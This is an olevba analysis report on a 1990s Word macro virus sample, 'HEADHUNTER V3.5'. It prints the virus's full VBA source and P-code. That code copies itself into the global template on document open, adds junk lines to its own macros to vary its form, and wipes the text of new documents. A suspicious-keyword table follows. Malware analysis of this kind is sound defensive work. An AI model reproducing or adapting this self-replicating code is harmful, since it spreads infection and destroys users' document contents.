olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hunter.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hunter.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ExtrasMakro.bas 
in file: Virus.MSWord.Hunter.d - OLE stream: 'Macros/VBA/ExtrasMakro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub Main()
Attribute Main.VB_Description = "Erstellt, lцscht und ьberarbeitet einen Makro oder fьhrt ihn aus."
Attribute Main.VB_ProcData.VB_Invoke_Func = "TemplateProject.ExtrasMakro.Main"
On Error GoTo -1: On Error GoTo Exit_
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.ToolsMacro(False)
WordBasic.CurValues.ToolsMacro dlg
dlg.Show = 1
WordBasic.Dialog.ToolsMacro dlg
WordBasic.ToolsMacro dlg
Exit_:
End Sub
-------------------------------------------------------------------------------
VBA MACRO DateiNeu.bas 
in file: Virus.MSWord.Hunter.d - OLE stream: 'Macros/VBA/DateiNeu'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub Main()
Attribute Main.VB_Description = "Erstellt ein neues Dokument oder eine Dokumentvorlage."
Attribute Main.VB_ProcData.VB_Invoke_Func = "TemplateProject.DateiNeu.Main"
Dim TOYDMGUO
Dim F242$
Dim GUGASYN
On Error GoTo -1: On Error GoTo Exit_
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileNew(False)
WordBasic.CurValues.FileNew dlg

TOYDMGUO = 128

WordBasic.Dialog.FileNew dlg
F242$ = WordBasic.[DefaultDir$](8) + "\WINWORD.DOT"
If WordBasic.[Files$](F242$) <> "" Then
 dlg.Template = F242$
 dlg.NewTemplate = 1
End If
WordBasic.FileNew dlg
WordBasic.EditSelectAll
WordBasic.WW6_EditClear

GUGASYN = 170

Exit_:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Hunter.d - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub Main()
Dim f$
Dim m
Dim WIBZBOT
Dim i
Dim a$
Dim F242$
On Error GoTo -1: On Error GoTo Exit_

Rem ***********************************************************************
Rem ***      <HEADHUNTER V3.5> by Neurobasher, 5.11.1995, Germany       ***
Rem *** Boring experimental Winword virus with minor poly/retro/stealth ***
Rem ***********************************************************************
Rem *** "I'm looking for a man who knows the rules of the game"         ***
Rem *** "Who's able to forget them to realize my aim"                   ***
Rem ***********************************************************************

If WordBasic.Second(WordBasic.Now()) < 5 Then
 WordBasic.ScreenUpdating
 Select Case WordBasic.Int(Rnd() * 2)
  Case 0
    f$ = "AutoOpen"
    m = 30
  Case 1
    f$ = "DateiNeu"

WIBZBOT = 197

    m = 15
  Case 2
    f$ = "ExtrasMakro"
    m = 10
 End Select
 WordBasic.ToolsMacro Name:=f$, Edit:=1, Show:=3
 WordBasic.ParaDown WordBasic.Int(Rnd() * m) + 1
 For i = 1 To WordBasic.Int(Rnd() * 10) + 2
  a$ = a$ + Chr(WordBasic.Int(Rnd() * 26) + 65)
 Next i
 WordBasic.Insert Chr(13) + a$ + " =" + Str(WordBasic.Int(Rnd() * 242)) + Chr(13) + Chr(13)
 WordBasic.DocClose 1
 WordBasic.FileSave
 WordBasic.ScreenUpdating 1
End If

If WordBasic.[DefaultDir$](8) = "" Then
 WordBasic.MkDir WordBasic.[DefaultDir$](9) + "\AutoStrt"
 WordBasic.ChDefaultDir WordBasic.[DefaultDir$](9) + "\AutoStrt", 8
End If

F242$ = WordBasic.[DefaultDir$](8) + "\WINWORD.DOT"
If WordBasic.[Files$](F242$) = "" Then
 WordBasic.CopyFile WordBasic.[FileName$](), F242$
 WordBasic.AddAddIn F242$, 1
End If

Exit_:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Hunter.d
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/ExtrasMakro - 1604 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub Main())
' Line #2:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Exit_ 
' Line #3:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd ToolsMacro 0x0001 
' 	Set dlg 
' Line #4:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall ToolsMacro 0x0001 
' Line #5:
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Show 
' Line #6:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall ToolsMacro 0x0001 
' Line #7:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsMacro 0x0001 
' Line #8:
' 	Label Exit_ 
' Line #9:
' 	EndSub 
' Macros/VBA/DateiNeu - 2157 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub Main())
' Line #2:
' 	Dim 
' 	VarDefn TOYDMGUO
' Line #3:
' 	Dim 
' 	VarDefn F242
' Line #4:
' 	Dim 
' 	VarDefn GUGASYN
' Line #5:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Exit_ 
' Line #6:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileNew 0x0001 
' 	Set dlg 
' Line #7:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileNew 0x0001 
' Line #8:
' Line #9:
' 	LitDI2 0x0080 
' 	St TOYDMGUO 
' Line #10:
' Line #11:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileNew 0x0001 
' Line #12:
' 	LitDI2 0x0008 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x000C "\WINWORD.DOT"
' 	Add 
' 	St F242$ 
' Line #13:
' 	Ld F242$ 
' 	Ld WordBasic 
' 	ArgsMemLd [Files$] 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #14:
' 	Ld F242$ 
' 	Ld dlg 
' 	MemSt Template 
' Line #15:
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt NewTemplate 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileNew 0x0001 
' Line #18:
' 	Ld WordBasic 
' 	ArgsMemCall EditSelectAll 0x0000 
' Line #19:
' 	Ld WordBasic 
' 	ArgsMemCall WW6_EditClear 0x0000 
' Line #20:
' Line #21:
' 	LitDI2 0x00AA 
' 	St GUGASYN 
' Line #22:
' Line #23:
' 	Label Exit_ 
' Line #24:
' 	EndSub 
' Macros/VBA/AutoOpen - 3871 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub Main())
' Line #2:
' 	Dim 
' 	VarDefn False
' Line #3:
' 	Dim 
' 	VarDefn m
' Line #4:
' 	Dim 
' 	VarDefn WIBZBOT
' Line #5:
' 	Dim 
' 	VarDefn i
' Line #6:
' 	Dim 
' 	VarDefn a
' Line #7:
' 	Dim 
' 	VarDefn F242
' Line #8:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Exit_ 
' Line #9:
' Line #10:
' 	Rem 0x0048 " ***********************************************************************"
' Line #11:
' 	Rem 0x0048 " ***      <HEADHUNTER V3.5> by Neurobasher, 5.11.1995, Germany       ***"
' Line #12:
' 	Rem 0x0048 " *** Boring experimental Winword virus with minor poly/retro/stealth ***"
' Line #13:
' 	Rem 0x0048 " ***********************************************************************"
' Line #14:
' 	Rem 0x0048 " *** "I'm looking for a man who knows the rules of the game"         ***"
' Line #15:
' 	Rem 0x0048 " *** "Who's able to forget them to realize my aim"                   ***"
' Line #16:
' 	Rem 0x0048 " ***********************************************************************"
' Line #17:
' Line #18:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Second 0x0001 
' 	LitDI2 0x0005 
' 	Lt 
' 	IfBlock 
' Line #19:
' 	Ld WordBasic 
' 	ArgsMemCall ScreenUpdating 0x0000 
' Line #20:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0002 
' 	Mul 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	SelectCase 
' Line #21:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' Line #22:
' 	LitStr 0x0008 "AutoOpen"
' 	St False$ 
' Line #23:
' 	LitDI2 0x001E 
' 	St m 
' Line #24:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #25:
' 	LitStr 0x0008 "DateiNeu"
' 	St False$ 
' Line #26:
' Line #27:
' 	LitDI2 0x00C5 
' 	St WIBZBOT 
' Line #28:
' Line #29:
' 	LitDI2 0x000F 
' 	St m 
' Line #30:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #31:
' 	LitStr 0x000B "ExtrasMakro"
' 	St False$ 
' Line #32:
' 	LitDI2 0x000A 
' 	St m 
' Line #33:
' 	EndSelect 
' Line #34:
' 	Ld False$ 
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Edit 
' 	LitDI2 0x0003 
' 	ParamNamed Show 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsMacro 0x0003 
' Line #35:
' 	ArgsLd Rnd 0x0000 
' 	Ld m 
' 	Mul 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall ParaDown 0x0001 
' Line #36:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x000A 
' 	Mul 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	LitDI2 0x0002 
' 	Add 
' 	For 
' Line #37:
' 	Ld a$ 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x001A 
' 	Mul 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St a$ 
' Line #38:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #39:
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ld a$ 
' 	Add 
' 	LitStr 0x0002 " ="
' 	Add 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x00F2 
' 	Mul 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #40:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall DocClose 0x0001 
' Line #41:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #42:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall ScreenUpdating 0x0001 
' Line #43:
' 	EndIfBlock 
' Line #44:
' Line #45:
' 	LitDI2 0x0008 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #46:
' 	LitDI2 0x0009 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x0009 "\AutoStrt"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MkDir 0x0001 
' Line #47:
' 	LitDI2 0x0009 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x0009 "\AutoStrt"
' 	Add 
' 	LitDI2 0x0008 
' 	Ld WordBasic 
' 	ArgsMemCall ChDefaultDir 0x0002 
' Line #48:
' 	EndIfBlock 
' Line #49:
' Line #50:
' 	LitDI2 0x0008 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x000C "\WINWORD.DOT"
' 	Add 
' 	St F242$ 
' Line #51:
' 	Ld F242$ 
' 	Ld WordBasic 
' 	ArgsMemLd [Files$] 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #52:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	Ld F242$ 
' 	Ld WordBasic 
' 	ArgsMemCall CopyFile 0x0002 
' Line #53:
' 	Ld F242$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall AddAddIn 0x0002 
' Line #54:
' 	EndIfBlock 
' Line #55:
' Line #56:
' 	Label Exit_ 
' Line #57:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

